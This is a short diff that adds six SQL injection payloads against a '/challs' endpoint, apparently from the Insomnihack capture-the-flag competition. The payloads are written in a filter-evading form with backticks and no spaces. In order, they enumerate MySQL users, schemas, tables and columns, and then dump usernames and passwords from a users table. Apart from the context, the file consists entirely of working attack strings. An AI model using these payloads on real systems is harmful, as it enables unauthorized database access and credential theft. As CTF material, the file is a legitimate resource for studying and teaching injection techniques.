@@ -1,0 +1,6 @@
+/challs id`UNION(SELECT`user,'2','3','4'FROM`mysql`.`user`)
+/challs ''UNION(SELECT'1',CHARACTER_SET_NAME,'3','4'FROM`information_schema`.`CHARACTER_SETS`)
+/challs ''UNION(SELECT'1',SCHEMA_NAME,'3','4'FROM`information_schema`.`SCHEMATA`)
+/challs ''UNION(SELECT'1',TABLE_NAME,'3','4'FROM`information_schema`.`TABLES`WHERE`TABLE_SCHEMA`='insomnihack')
+/challs ''UNION(SELECT'1',COLUMN_NAME,'3','4'FROM`information_schema`.`COLUMNS`WHERE`TABLE_NAME`='users')
+/challs ''UNION(SELECT'1',username,password,'4'FROM`users`)
